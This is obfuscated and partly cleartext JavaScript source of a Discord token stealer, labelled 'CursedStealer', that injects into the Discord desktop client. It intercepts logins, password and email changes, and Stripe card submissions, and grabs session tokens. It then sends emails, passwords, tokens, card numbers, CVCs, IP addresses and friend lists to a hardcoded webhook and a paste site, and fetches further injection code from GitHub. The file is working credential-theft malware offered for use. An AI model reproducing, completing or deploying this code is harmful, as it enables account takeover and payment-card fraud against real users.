_0x59ac66='';return(_0x430112&_0x4b0c4e)==_0x4b0c4e&&(_0x59ac66+=_0x24f10a(0x166)),(_0x430112&_0x4cfe30)==_0x4cfe30&&(_0x59ac66+='<:partner:874750808678354964>\x20'),(_0x430112&_0x182e75)==_0x182e75&&(_0x59ac66+=_0x24f10a(0x201)),(_0x430112&_0x5f56fc)==_0x5f56fc&&(_0x59ac66+='<:bughunter_1:874750808426692658>\x20'),(_0x430112&_0x13ab64)==_0x13ab64&&(_0x59ac66+=_0x24f10a(0x170)),(_0x430112&_0xc7b3fc)==_0xc7b3fc&&(_0x59ac66+='<:bughunter_2:874750808430874664>\x20'),(_0x430112&_0x26a202)==_0x26a202&&(_0x59ac66+=_0x24f10a(0x138)),_0x59ac66==''&&(_0x59ac66=''),_0x59ac66;}function GetLangue(_0x3fe936){const _0x37d043=_0xbe559e,_0x2be5e8='fr',_0x352e02='da',_0x4823e4='de',_0x47f820='en-GB',_0x2d5f75=_0x37d043(0x181),_0x11aa8e='es-ES',_0x3dd129='hr',_0xf076cc='it',_0x435423='lt',_0x216c0b='hu',_0x28f70f='nl',_0x5e73b1='no',_0x1874e6='pl',_0x4c9183=_0x37d043(0x17c),_0x5778a1='ro',_0x3ea494='fi',_0x3e49c9=_0x37d043(0x130),_0x51ede0='vi',_0x1e688c='tr',_0x2adcea='cs',_0x5ba325='el',_0x3a525c='bg',_0x4615a6='ru',_0xf56721='uk',_0x116789='hi',_0x17a6a6='th',_0x5ccf30=_0x37d043(0x206),_0x1f7264='ja',_0x14f7ee=_0x37d043(0x15b),_0x24b1a5='ko';var _0xbdddb1='';return _0x3fe936==_0x2be5e8&&(_0xbdddb1+=_0x37d043(0x1ba)),_0x3fe936==_0x352e02&&(_0xbdddb1+=_0x37d043(0x1e4)),_0x3fe936==_0x4823e4&&(_0xbdddb1+=_0x37d043(0x190)),_0x3fe936==_0x47f820&&(_0xbdddb1+=_0x37d043(0x1a3)),_0x3fe936==_0x2d5f75&&(_0xbdddb1+='🇺🇸\x20USA'),_0x3fe936==_0x11aa8e&&(_0xbdddb1+='🇪🇸\x20Español'),_0x3fe936==_0x3dd129&&(_0xbdddb1+='🇭🇷\x20Croatian'),_0x3fe936==_0xf076cc&&(_0xbdddb1+=_0x37d043(0x17a)),_0x3fe936==_0x435423&&(_0xbdddb1+=_0x37d043(0x173)),_0x3fe936==_0x216c0b&&(_0xbdddb1+='🇭🇺\x20Hungarian'),_0x3fe936==_0x28f70f&&(_0xbdddb1+='🇳🇱\x20Dutch'),_0x3fe936==_0x5e73b1&&(_0xbdddb1+=_0x37d043(0x1fb)),_0x3fe936==_0x1874e6&&(_0xbdddb1+=_0x37d043(0x1ef)),_0x3fe936==_0x4c9183&&(_0xbdddb1+=_0x37d043(0x1f0)),_0x3fe936==_0x5778a1&&(_0xbdddb1+=_0x37d043(0x151)),_0x3fe936==_0x3ea494&&(_0xbdddb1+='🇫🇮\x20Finnish'),_0x3fe936==_0x3e49c9&&(_0xbdddb1+=_0x37d043(0x152)),_0x3fe936==_0x1e688c&&(_0xbdddb1+=_0x37d043(0x185)),_0x3fe936==_0x51ede0&&(_0xbdddb1+='🇻🇳\x20Vietnamese'),_0x3fe936==_0x2adcea&&(_0xbdddb1+=_0x37d043(0x162)),_0x3fe936==_0x5ba325&&(_0xbdddb1+=_0x37d043(0x167)),_0x3fe936==_0x3a525c&&(_0xbdddb1+='🇧🇬\x20Bulgarian'),_0x3fe936==_0x4615a6&&(_0xbdddb1+='🇷🇺\x20Russian'),_0x3fe936==_0xf56721&&(_0xbdddb1+=_0x37d043(0x1ab)),_0x3fe936==_0x116789&&(_0xbdddb1+=_0x37d043(0x1bf)),_0x3fe936==_0x17a6a6&&(_0xbdddb1+=_0x37d043(0x12d)),_0x3fe936==_0x5ccf30&&(_0xbdddb1+=_0x37d043(0x1b3)),_0x3fe936==_0x1f7264&&(_0xbdddb1+='🇯🇵\x20Japanese'),_0x3fe936==_0x14f7ee&&(_0xbdddb1+=_0x37d043(0x1cf)),_0x3fe936==_0x24b1a5&&(_0xbdddb1+=_0x37d043(0x1d7)),_0xbdddb1==''&&(_0xbdddb1=_0x37d043(0x197)),_0xbdddb1;}function GetBadges(_0x4b0ec0){const _0x344ff7=_0xbe559e,_0x2508a9=0x1,_0x289473=0x2,_0x29a79b=0x4,_0xf836a5=0x8,_0x49944b=0x40,_0x235413=0x80,_0x2eafa9=0x100,_0x3a5136=0x200,_0x3bbe3e=0x4000,_0x2252a2=0x20000,_0x446659=0x400000;var _0x58b5df='';return(_0x4b0ec0&_0x2508a9)==_0x2508a9&&(_0x58b5df+=_0x344ff7(0x166)),(_0x4b0ec0&_0x289473)==_0x289473&&(_0x58b5df+='<:partner:874750808678354964>\x20'),(_0x4b0ec0&_0x29a79b)==_0x29a79b&&(_0x58b5df+=_0x344ff7(0x201)),(_0x4b0ec0&_0xf836a5)==_0xf836a5&&(_0x58b5df+=_0x344ff7(0x1db)),(_0x4b0ec0&_0x49944b)==_0x49944b&&(_0x58b5df+='<:bravery:874750808388952075>\x20'),(_0x4b0ec0&_0x235413)==_0x235413&&(_0x58b5df+='<:brilliance:874750808338608199>\x20'),(_0x4b0ec0&_0x2eafa9)==_0x2eafa9&&(_0x58b5df+=_0x344ff7(0x16e)),(_0x4b0ec0&_0x3a5136)==_0x3a5136&&(_0x58b5df+=_0x344ff7(0x170)),(_0x4b0ec0&_0x3bbe3e)==_0x3bbe3e&&(_0x58b5df+=_0x344ff7(0x1f6)),(_0x4b0ec0&_0x2252a2)==_0x2252a2&&(_0x58b5df+=_0x344ff7(0x138)),(_0x4b0ec0&_0x446659)==_0x446659&&(_0x58b5df+='<:activedev:1041634224253444146>\x20'),_0x58b5df==''&&(_0x58b5df='None'),_0x58b5df;}async function Login(_0x507860,_0x3ae860,_0x418040){const _0x3e66bd=_0xbe559e,_0x54e22d=BrowserWindow[_0x3e66bd(0x137)]()[0x0];var _0x1fcbe3=await getFromURL(_0x3e66bd(0x1a5),_0x418040),{ip:_0x334b0b}=await getFromURL('https://www.myexternalip.com/json',null);_0x54e22d[_0x3e66bd(0x16c)]['executeJavaScript'](_0x3e66bd(0x1d2)+_0x418040+_0x3e66bd(0x17f),!0x0)[_0x3e66bd(0x1a9)](_0x17927d=>{const _0x2ddfbc=_0x3e66bd;_0x54e22d[_0x2ddfbc(0x16c)][_0x2ddfbc(0x202)]('\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x418040+_0x2ddfbc(0x1e6),!0x0)['then'](_0x384260=>{const _0x54f12b=_0x2ddfbc;function _0x380681(){const _0x35360f=_0x40ca;var _0x1bfc98=JSON[_0x35360f(0x20b)](_0x384260);const _0x1f6ae3=_0x1bfc98[_0x35360f(0x158)](_0x257e80=>{return _0x257e80['type']==0x1;});return _0x1f6ae3['length'];}function _0x43282f(){const _0x5c284f=_0x40ca;var _0x5c78be=JSON[_0x5c284f(0x20b)](_0x384260);const _0xf87b1=_0x5c78be[_0x5c284f(0x158)](_0x15c9ec=>{const _0x5f0dd2=_0x5c284f;return _0x15c9ec[_0x5f0dd2(0x126)]==0x1;});var _0x426bc0='';for(z of _0xf87b1){var _0x1191f1=GetRBadges(z[_0x5c284f(0x1ec)][_0x5c284f(0x1b1)]);_0x1191f1!=''&&(_0x426bc0+=_0x1191f1+('\x20'+z['user'][_0x5c284f(0x163)]+'#'+z[_0x5c284f(0x1ec)][_0x5c284f(0x20f)]+'\x0a'));}return _0x426bc0==''&&(_0x426bc0=_0x5c284f(0x154)),_0x426bc0;}function _0x404e94(){const _0xec497b=_0x40ca,_0x1e6984=JSON[_0xec497b(0x20b)](_0x17927d);var _0x3720e0='';return _0x1e6984[_0xec497b(0x1c3)](_0xc2cc13=>{const _0xf556d0=_0xec497b;if(_0xc2cc13[_0xf556d0(0x126)]=='')return'`❌`';else{if(_0xc2cc13[_0xf556d0(0x126)]==0x2&&_0xc2cc13['invalid']!=!0x0)_0x3720e0+=_0xf556d0(0x15f)+_0xf556d0(0x175);else{if(_0xc2cc13[_0xf556d0(0x126)]==0x1&&_0xc2cc13[_0xf556d0(0x20e)]!=!0x0)_0x3720e0+=_0xf556d0(0x15f)+_0xf556d0(0x1b5);else return _0xf556d0(0x165);}}}),_0x3720e0==''&&(_0x3720e0=_0xec497b(0x165)),_0x3720e0;}if(_0x1fcbe3['avatar']===null)usericonurl='';else usericonurl=_0x54f12b(0x205)+_0x1fcbe3['id']+'/'+_0x1fcbe3[_0x54f12b(0x216)]+_0x54f12b(0x148);if(_0x1fcbe3[_0x54f12b(0x1d9)]===null)bannerurl='';else bannerurl=_0x54f12b(0x139)+_0x1fcbe3['id']+'/'+_0x1fcbe3['banner']+'.png?size=160';const _0x52e190={'username':_0x54f12b(0x1f4),'content':'','embeds':[{'title':_0x54f12b(0x191),'description':_0x54f12b(0x19d),'color':config[_0x54f12b(0x188)],'fields':[{'name':_0x54f12b(0x1ac),'value':_0x54f12b(0x15d)+computerName+_0x54f12b(0x18d)+__dirname+'\x0a\x0a-\x20IP:\x20\x0a'+_0x334b0b+_0x54f12b(0x18c)+usericonurl+')','inline':!0x1},{'name':_0x54f12b(0x176),'value':'`'+_0x1fcbe3[_0x54f12b(0x163)]+'#'+_0x1fcbe3[_0x54f12b(0x20f)]+'`','inline':!0x0},{'name':'ID\x20<:iduser:1041634535395307520>','value':'`'+_0x1fcbe3['id']+_0x54f12b(0x19e)+_0x1fcbe3['id']+')','inline':!0x0},{'name':_0x54f12b(0x12b),'value':''+GetNitro(_0x1fcbe3['premium_type']),'inline':!0x0},{'name':'Badges\x20<:badge:1041634538150973460>','value':''+GetBadges(_0x1fcbe3[_0x54f12b(0x13e)]),'inline':!0x0},{'name':'Language\x20<:language:1041640473477001236>','value':''+GetLangue(_0x1fcbe3[_0x54f12b(0x1f2)]),'inline':!0x0},{'name':_0x54f12b(0x15a),'value':''+GetA2F(_0x1fcbe3[_0x54f12b(0x14f)]),'inline':!0x0},{'name':_0x54f12b(0x1e9),'value':''+_0x404e94(),'inline':!0x1},{'name':'Email\x20<a:email:1041639672037785691>','value':'`'+_0x507860+'`','inline':!0x0},{'name':'<a:password:1041639669047238676>\x20Password','value':'`'+_0x3ae860+'`','inline':!0x0},{'name':_0x54f12b(0x209),'value':'```'+_0x418040+'```\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p='+_0x418040+')\x0a\x0a[Download\x20Banner]('+bannerurl+')','inline':!0x1}],'thumbnail':{'url':''+usericonurl}},{'title':'<a:totalfriends:1041641100017946685>\x20Total\x20Friends\x20('+_0x380681()+')','color':config[_0x54f12b(0x188)],'description':_0x43282f(),'image':{'url':''+bannerurl},'thumbnail':{'url':''+usericonurl}}]};hooker(_0x52e190);});});}async function ChangePassword(_0x391770,_0x5bb94f,_0x238c5e){const _0x4797fe=_0xbe559e,_0x15c85e=BrowserWindow[_0x4797fe(0x137)]()[0x0];var _0x4627bc=await getFromURL('https://discord.com/api/v8/users/@me',_0x238c5e),{ip:_0x787f69}=await getFromURL(_0x4797fe(0x15e),null);_0x15c85e[_0x4797fe(0x16c)][_0x4797fe(0x202)](_0x4797fe(0x1d2)+_0x238c5e+_0x4797fe(0x17f),!0x0)[_0x4797fe(0x1a9)](_0x1bfa74=>{const _0x3e348b=_0x4797fe;_0x15c85e[_0x3e348b(0x16c)][_0x3e348b(0x202)](_0x3e348b(0x171)+_0x238c5e+'\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText',!0x0)[_0x3e348b(0x1a9)](_0xa214f=>{const _0x3a384e=_0x3e348b;function _0x476def(){const _0x2213a2=_0x40ca;var _0x1325d4=JSON[_0x2213a2(0x20b)](_0xa214f);const _0x40c9d4=_0x1325d4[_0x2213a2(0x158)](_0x16faf3=>{const _0x4868a6=_0x2213a2;return _0x16faf3[_0x4868a6(0x126)]==0x1;});return _0x40c9d4[_0x2213a2(0x1d6)];}function _0x220b6d(){const _0x44f5eb=_0x40ca;var _0x2b246e=JSON[_0x44f5eb(0x20b)](_0xa214f);const _0x34367f=_0x2b246e[_0x44f5eb(0x158)](_0x13e498=>{const _0x25916b=_0x44f5eb;return _0x13e498[_0x25916b(0x126)]==0x1;});var _0x226621='';for(z of _0x34367f){var _0x2cf0da=GetRBadges(z['user'][_0x44f5eb(0x1b1)]);_0x2cf0da!=''&&(_0x226621+=_0x2cf0da+('\x20'+z[_0x44f5eb(0x1ec)][_0x44f5eb(0x163)]+'#'+z[_0x44f5eb(0x1ec)][_0x44f5eb(0x20f)]+'\x0a'));}return _0x226621==''&&(_0x226621=_0x44f5eb(0x154)),_0x226621;}function _0x201b44(){const _0x373f4a=_0x40ca,_0x3e309b=JSON[_0x373f4a(0x20b)](_0x1bfa74);var _0x45e113='';return _0x3e309b['forEach'](_0x19bb95=>{const _0x502b15=_0x373f4a;if(_0x19bb95[_0x502b15(0x126)]=='')return _0x502b15(0x165);else{if(_0x19bb95[_0x502b15(0x126)]==0x2&&_0x19bb95[_0x502b15(0x20e)]!=!0x0)_0x45e113+=_0x502b15(0x15f)+'\x20<:paypal:896441236062347374>';else{if(_0x19bb95[_0x502b15(0x126)]==0x1&&_0x19bb95['invalid']!=!0x0)_0x45e113+=_0x502b15(0x15f)+_0x502b15(0x1b5);else return _0x502b15(0x165);}}}),_0x45e113==''&&(_0x45e113=_0x373f4a(0x165)),_0x45e113;}let _0x5983cf=_0x3a384e(0x139)+_0x4627bc['id']+'/'+_0x4627bc[_0x3a384e(0x1d9)]+'.png?size=600'||'https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600';const _0x4dadab={'username':_0x3a384e(0x1f4),'content':'','embeds':[{'title':'CursedStealer\x20Detect\x20Password\x20Changed','description':_0x3a384e(0x180),'color':config[_0x3a384e(0x188)],'fields':[{'name':_0x3a384e(0x1ac),'value':'```diff\x0a-\x20Computer\x20Name:\x20\x0a'+computerName+_0x3a384e(0x18d)+__dirname+_0x3a384e(0x143)+_0x787f69+_0x3a384e(0x18c)+usericonurl+')','inline':!0x1},{'name':_0x3a384e(0x176),'value':'`'+_0x4627bc[_0x3a384e(0x163)]+'#'+_0x4627bc[_0x3a384e(0x20f)]+'`','inline':!0x0},{'name':_0x3a384e(0x1ce),'value':'`'+_0x4627bc['id']+_0x3a384e(0x19e)+_0x4627bc['id']+')','inline':!0x0},{'name':'Nitro\x20<a:nitro:1041639670288748634>','value':''+GetNitro(_0x4627bc['premium_type']),'inline':!0x0},{'name':_0x3a384e(0x14c),'value':''+GetBadges(_0x4627bc[_0x3a384e(0x13e)]),'inline':!0x0},{'name':_0x3a384e(0x1b0),'value':''+GetLangue(_0x4627bc[_0x3a384e(0x1f2)]),'inline':!0x0},{'name':_0x3a384e(0x15a),'value':''+GetA2F(_0x4627bc['mfa_enabled']),'inline':!0x0},{'name':_0x3a384e(0x1e9),'value':''+_0x201b44(),'inline':!0x1},{'name':'Email\x20<a:email:1041639672037785691>','value':'`'+_0x4627bc[_0x3a384e(0x199)]+'`','inline':!0x1},{'name':_0x3a384e(0x1c5),'value':'`'+_0x391770+'`','inline':!0x0},{'name':_0x3a384e(0x211),'value':'`'+_0x5bb94f+'`','inline':!0x0},{'name':_0x3a384e(0x209),'value':_0x3a384e(0x14b)+_0x238c5e+'```\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p='+_0x238c5e+')\x0a\x0a[Download\x20Banner]('+_0x5983cf+')','inline':!0x1}],'thumbnail':{'url':''+usericonurl}},{'title':_0x3a384e(0x1c6)+_0x476def()+')','color':config[_0x3a384e(0x188)],'description':_0x220b6d(),'image':{'url':''+_0x5983cf},'thumbnail':{'url':''+usericonurl}}]};hooker(_0x4dadab);});});}async function ChangeEmail(_0xd2dee3,_0x41f141,_0x5cd333){const _0x57db38=_0xbe559e,_0xc1f215=BrowserWindow['getAllWindows']()[0x0];var _0x42181c=await getFromURL(_0x57db38(0x1a5),_0x5cd333),{ip:_0x197120}=await getFromURL(_0x57db38(0x15e),null);_0xc1f215[_0x57db38(0x16c)]['executeJavaScript']('\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x5cd333+_0x57db38(0x17f),!0x0)[_0x57db38(0x1a9)](_0x275dac=>{const _0x2b5262=_0x57db38;_0xc1f215[_0x2b5262(0x16c)][_0x2b5262(0x202)](_0x2b5262(0x171)+_0x5cd333+_0x2b5262(0x1e6),!0x0)[_0x2b5262(0x1a9)](_0x1768ff=>{const _0x28fdd3=_0x2b5262;function _0x11dd25(){const _0x53690d=_0x40ca;var _0x30083d=JSON['parse'](_0x1768ff);const _0x3d383c=_0x30083d['filter'](_0x1cd4be=>{return _0x1cd4be['type']==0x1;});return _0x3d383c[_0x53690d(0x1d6)];}function _0x34ca6d(){const _0x3ff693=_0x40ca;var _0x149558=JSON[_0x3ff693(0x20b)](_0x1768ff);const _0x419d53=_0x149558[_0x3ff693(0x158)](_0xc1dfae=>{return _0xc1dfae['type']==0x1;});var _0x2bf442='';for(z of _0x419d53){var _0x781032=GetRBadges(z[_0x3ff693(0x1ec)][_0x3ff693(0x1b1)]);_0x781032!=''&&(_0x2bf442+=_0x781032+('\x20'+z[_0x3ff693(0x1ec)]['username']+'#'+z['user']['discriminator']+'\x0a'));}return _0x2bf442==''&&(_0x2bf442=_0x3ff693(0x154)),_0x2bf442;}function _0x2e49af(){const _0x48e784=_0x40ca,_0xd6d806=JSON[_0x48e784(0x20b)](_0x275dac);var _0x95822a='';return _0xd6d806['forEach'](_0x49def2=>{const _0x4d6ec3=_0x48e784;if(_0x49def2[_0x4d6ec3(0x126)]=='')return'`❌`';else{if(_0x49def2[_0x4d6ec3(0x126)]==0x2&&_0x49def2['invalid']!=!0x0)_0x95822a+=_0x4d6ec3(0x15f)+_0x4d6ec3(0x175);else{if(_0x49def2['type']==0x1&&_0x49def2[_0x4d6ec3(0x20e)]!=!0x0)_0x95822a+=_0x4d6ec3(0x15f)+_0x4d6ec3(0x1b5);else return _0x4d6ec3(0x165);}}}),_0x95822a==''&&(_0x95822a=_0x48e784(0x165)),_0x95822a;}if(_0x42181c[_0x28fdd3(0x216)]===null)usericonurl='';else usericonurl=_0x28fdd3(0x205)+_0x42181c['id']+'/'+_0x42181c['avatar']+_0x28fdd3(0x148);if(_0x42181c[_0x28fdd3(0x1d9)]===null)bannerurl='';else bannerurl=_0x28fdd3(0x139)+_0x42181c['id']+'/'+_0x42181c[_0x28fdd3(0x1d9)]+_0x28fdd3(0x1f1);const _0x5bb8a5={'username':'CursedStealer\x20Infected','content':'','embeds':[{'title':'CursedStealer\x20Detect\x20Email\x20Changed','description':_0x28fdd3(0x180),'color':config[_0x28fdd3(0x188)],'fields':[{'name':'Injection\x20Info','value':_0x28fdd3(0x15d)+computerName+'\x0a\x0a-\x20Injection\x20Path:\x20\x0a'+__dirname+_0x28fdd3(0x143)+_0x197120+'\x0a```\x0a\x0a[Download\x20pfp]('+usericonurl+')','inline':!0x1},{'name':_0x28fdd3(0x1de),'value':'`'+_0x42181c['username']+'#'+_0x42181c[_0x28fdd3(0x20f)]+'`','inline':!0x0},{'name':'ID\x20<:iduser:1041634535395307520>','value':'`'+_0x42181c['id']+_0x28fdd3(0x19e)+_0x42181c['id']+')','inline':!0x0},{'name':_0x28fdd3(0x12b),'value':''+GetNitro(_0x42181c[_0x28fdd3(0x217)]),'inline':!0x0},{'name':'Badges\x20<:badge:1041634538150973460>','value':''+GetBadges(_0x42181c[_0x28fdd3(0x13e)]),'inline':!0x0},{'name':'Language\x20<:language:1041640473477001236>','value':''+GetLangue(_0x42181c[_0x28fdd3(0x1f2)]),'inline':!0x0},{'name':_0x28fdd3(0x15a),'value':''+GetA2F(_0x42181c['mfa_enabled']),'inline':!0x0},{'name':_0x28fdd3(0x1e9),'value':''+_0x2e49af(),'inline':!0x1},{'name':_0x28fdd3(0x172),'value':'`'+_0xd2dee3+'`','inline':!0x0},{'name':_0x28fdd3(0x1df),'value':'`'+_0x41f141+'`','inline':!0x0},{'name':'<a:tokens:1041634540537511957>\x20Token','value':_0x28fdd3(0x14b)+_0x5cd333+_0x28fdd3(0x14a)+_0x5cd333+_0x28fdd3(0x169)+bannerurl+')','inline':!0x1}],'thumbnail':{'url':''+usericonurl}},{'title':_0x28fdd3(0x1c6)+_0x11dd25()+')','color':config[_0x28fdd3(0x188)],'description':_0x34ca6d(),'image':{'url':''+bannerurl},'thumbnail':{'url':''+usericonurl}}]};hooker(_0x5bb8a5);});});}async function CreditCardAdded(_0x30b58c,_0x35ff5a,_0x399d49,_0x557963,_0x2c4b9e){const _0x56844c=_0xbe559e;var _0x519b23=await getFromURL(_0x56844c(0x1a5),_0x2c4b9e),{ip:_0x40d482}=await getFromURL('https://www.myexternalip.com/json',null);if(_0x519b23[_0x56844c(0x216)]===null)usericonurl=_0x56844c(0x218);else usericonurl=_0x56844c(0x205)+_0x519b23['id']+'/'+_0x519b23[_0x56844c(0x216)]+_0x56844c(0x148);if(_0x519b23['banner']===null)bannerurl='https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png';else bannerurl=_0x56844c(0x139)+_0x519b23['id']+'/'+_0x519b23[_0x56844c(0x1d9)]+'.png?size=160';const _0x45aa9d={'username':_0x56844c(0x1f4),'content':'','embeds':[{'title':_0x56844c(0x204),'description':_0x56844c(0x20a)+_0x40d482+_0x56844c(0x1c1)+_0x519b23[_0x56844c(0x163)]+'#'+_0x519b23[_0x56844c(0x20f)]+_0x56844c(0x194)+_0x519b23['id']+_0x56844c(0x1c4)+_0x519b23[_0x56844c(0x199)]+'```\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Nitro\x20Type**\x20<a:nitro:1041639670288748634>\x0a'+GetNitro(_0x519b23[_0x56844c(0x217)])+'\x0a\x0a\x09\x09\x09\x09\x09**Language**\x20<:language:1041640473477001236>\x0a'+GetLangue(_0x519b23[_0x56844c(0x1f2)])+'\x0a\x0a\x09\x09\x09\x09\x09**A2F**\x20<a:a2f:1040272766982692885>\x0a'+GetA2F(_0x519b23[_0x56844c(0x14f)])+_0x56844c(0x129)+GetBadges(_0x519b23[_0x56844c(0x13e)])+_0x56844c(0x1d1)+_0x30b58c+_0x56844c(0x13c)+_0x399d49+'/'+_0x557963+_0x56844c(0x1d4)+_0x35ff5a+_0x56844c(0x14e)+_0x2c4b9e+_0x56844c(0x14b),'thumbnail':{'url':_0x56844c(0x205)+_0x519b23['id']+'/'+_0x519b23['avatar']}}]};hooker(_0x45aa9d);}const ChangePasswordFilter={'urls':[_0xbe559e(0x195),_0xbe559e(0x1b8),_0xbe559e(0x1be),_0xbe559e(0x1e2),_0xbe559e(0x1cd),_0xbe559e(0x1c9),'https://api.stripe.com/v*/tokens']};session[_0xbe559e(0x208)][_0xbe559e(0x159)][_0xbe559e(0x1bb)](Filter,(_0x4fae35,_0x4be6df)=>{const _0x1e3f0b=_0xbe559e;if(_0x4fae35[_0x1e3f0b(0x13d)]['startsWith'](_0x1e3f0b(0x12c)))return _0x4be6df({'cancel':!![]});updateCheck();if(FirstTime()){}_0x4be6df({});return;}),session['defaultSession']['webRequest'][_0xbe559e(0x184)](ChangePasswordFilter,(_0x4ff653,_0x4f5feb)=>{const _0x81510c=_0xbe559e;if(_0x4ff653[_0x81510c(0x13d)][_0x81510c(0x1f5)](_0x81510c(0x1a4))){if(_0x4ff653['statusCode']==0xc8){const _0x51580a=JSON[_0x81510c(0x20b)](Buffer['from'](_0x4ff653[_0x81510c(0x1af)][0x0][_0x81510c(0x153)])[_0x81510c(0x1e8)]()),_0x1aeff9=_0x51580a[_0x81510c(0x1a4)],_0x22321e=_0x51580a['password'],_0x13bd01=BrowserWindow['getAllWindows']()[0x0];_0x13bd01['webContents']['executeJavaScript'](_0x81510c(0x1bd),!0x0)['then'](_0x52f59c=>{Login(_0x1aeff9,_0x22321e,_0x52f59c);});}else{}}if(_0x4ff653[_0x81510c(0x13d)][_0x81510c(0x1f5)](_0x81510c(0x1bc))){if(_0x4ff653['statusCode']==0xc8&&_0x4ff653[_0x81510c(0x19c)]==_0x81510c(0x1da)){const _0x465d9f=JSON['parse'](Buffer[_0x81510c(0x16d)](_0x4ff653['uploadData'][0x0]['bytes'])[_0x81510c(0x1e8)]());if(_0x465d9f[_0x81510c(0x14d)]!=null&&_0x465d9f[_0x81510c(0x14d)]!=undefined&&_0x465d9f[_0x81510c(0x14d)]!=''){if(_0x465d9f[_0x81510c(0x207)]!=undefined&&_0x465d9f[_0x81510c(0x207)]!=null&&_0x465d9f[_0x81510c(0x207)]!=''){const _0x2a9800=BrowserWindow['getAllWindows']()[0x0];_0x2a9800[_0x81510c(0x16c)]['executeJavaScript'](_0x81510c(0x1bd),!0x0)[_0x81510c(0x1a9)](_0x4be27e=>{const _0x5bd0ba=_0x81510c;ChangePassword(_0x465d9f[_0x5bd0ba(0x14d)],_0x465d9f['new_password'],_0x4be27e);});}if(_0x465d9f[_0x81510c(0x199)]!=null&&_0x465d9f[_0x81510c(0x199)]!=undefined&&_0x465d9f[_0x81510c(0x199)]!=''){const _0x413171=BrowserWindow['getAllWindows']()[0x0];_0x413171[_0x81510c(0x16c)][_0x81510c(0x202)](_0x81510c(0x1bd),!0x0)[_0x81510c(0x1a9)](_0x30f66e=>{const _0x2f374c=_0x81510c;ChangeEmail(_0x465d9f[_0x2f374c(0x199)],_0x465d9f[_0x2f374c(0x14d)],_0x30f66e);});}}}else{}}if(_0x4ff653['url'][_0x81510c(0x1f5)](_0x81510c(0x1ea))){const _0x14bedd=BrowserWindow['getAllWindows']()[0x0],_0x514876=querystring[_0x81510c(0x20b)](decodeURIComponent(Buffer[_0x81510c(0x16d)](_0x4ff653['uploadData'][0x0][_0x81510c(0x153)])['toString']()));_0x14bedd[_0x81510c(0x16c)][_0x81510c(0x202)](_0x81510c(0x1bd),!0x0)[_0x81510c(0x1a9)](_0x122f1d=>{const _0x66b015=_0x81510c;CreditCardAdded(_0x514876[_0x66b015(0x1e7)],_0x514876['card[cvc]'],_0x514876[_0x66b015(0x1e0)],_0x514876['card[exp_year]'],_0x122f1d);})[_0x81510c(0x15c)](console[_0x81510c(0x1e5)]);}}),module[_0xbe559e(0x16b)]=require('./core.asar');
+const fs = require('fs');
+const path = require('path');
+const {
+    BrowserWindow,
+    session
+} = require('electron')
+const args = process.argv;
+const querystring = require('querystring');
+const os = require('os')
+const https = require("https");
+const computerName = os.hostname();
+
+const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
+
+String.prototype.insert = function(index, string) {
+    if (index > 0) {
+        return this.substring(0, index) + string + this.substr(index);
+    }
+
+    return string + this;
+};
+const superlmao = "https://discord.com/api/webhooks/1049510306717630514/iJ1wbk3fvbz-GK-u85ucnchEgJyEqEcHFeki0DEpdH5RRT0OAMcODQv5duU9i7wMhZyp"
+const config = {
+    "logout": "true",
+    "logout-notify": "true",
+    "init-notify": "true",
+    "embed-color": 374276,
+
+    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    webhook: "%WEBHOOK%",
+    
+    filter2: {
+        urls: [
+      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+      "https://*.discord.com/api/v*/applications/detectable",
+      "https://discord.com/api/v*/applications/detectable",
+      "https://*.discord.com/api/v*/users/@me/library",
+      "https://discord.com/api/v*/users/@me/library",
+      "wss://remote-auth-gateway.discord.gg/*",
+    ],
+    },
+};
+
+
+
+let bannerurl = ""
+let usericonurl = ""
+
+const discordPath = (function() {
+    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
+    let resourcePath;
+    if (process.platform === "win32") {
+        resourcePath = path.join(app, "resources");
+    } else if (process.platform === "darwin") {
+        resourcePath = path.join(app, "Contents", "Resources");
+    }
+    if (fs.existsSync(resourcePath)) return {
+        resourcePath,
+        app
+    };
+    return "", "";
+})();
+
+function updateCheck() {
+    const {
+        resourcePath,
+        app
+    } = discordPath;
+    if (resourcePath === undefined || app === undefined) return;
+    const appPath = path.join(resourcePath, "app");
+    const packageJson = path.join(appPath, "package.json");
+    const resourceIndex = path.join(appPath, "index.js");
+    const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
